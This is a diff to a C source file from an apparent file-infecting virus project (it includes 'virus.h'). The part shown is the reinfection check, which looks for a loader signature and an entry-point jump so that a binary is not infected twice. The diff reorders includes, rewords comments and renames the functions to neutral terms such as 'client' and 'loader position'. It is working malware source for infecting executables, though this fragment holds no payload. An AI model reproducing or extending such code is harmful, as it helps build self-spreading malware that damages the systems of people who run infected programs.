@@ -1,11 +1,11 @@
 #include "virus.h"
-#include "utils.h"
 #include "jumps.h"
-#include "errors.h"
+#include "utils.h"
 #include "compiler_utils.h"
+#include "errors.h"
 
 /*
-** if current binary is already our client, don't infect again ! <3
+** Don't infect again if current binary is already our client.
 */
 static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
 {
@@ -20,11 +20,11 @@ static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
 	return true;
 }
 
-static bool	check_infected_jump(struct safe_ptr file_ref, size_t entry_offset)
+static bool	check_client_jump(struct safe_ptr file_ref, size_t entry_offset)
 {
 	const void	*jump = find_first_jmp32(file_ref, entry_offset);
 
-	// drop this way if client can't be parsed
+	// drop this method if client can't be parsed
 	if (jump == NULL)
 		return true;
 
@@ -39,7 +39,7 @@ static bool	check_infected_jump(struct safe_ptr file_ref, size_t entry_offset)
 	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
 }
 
-static bool	check_infected_entry(struct safe_ptr file_ref, size_t loader_offset)
+static bool	check_loader_position(struct safe_ptr file_ref, size_t loader_offset)
 {
 	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
 }
@@ -50,8 +50,8 @@ bool		not_infected(const struct entry *file_entry,
 	const size_t	entry_offset  = file_entry->entry_offset;
 	const size_t	loader_offset = file_entry->payload_offset;
 
-	if (!check_infected_entry(file_ref, loader_offset)
-	|| !check_infected_jump(file_ref, entry_offset))
+	if (!check_loader_position(file_ref, loader_offset)
+	|| !check_client_jump(file_ref, entry_offset))
 		return errors(ERR_THROW, _ERR_T_NOT_INFECTED);
 
 	return true;
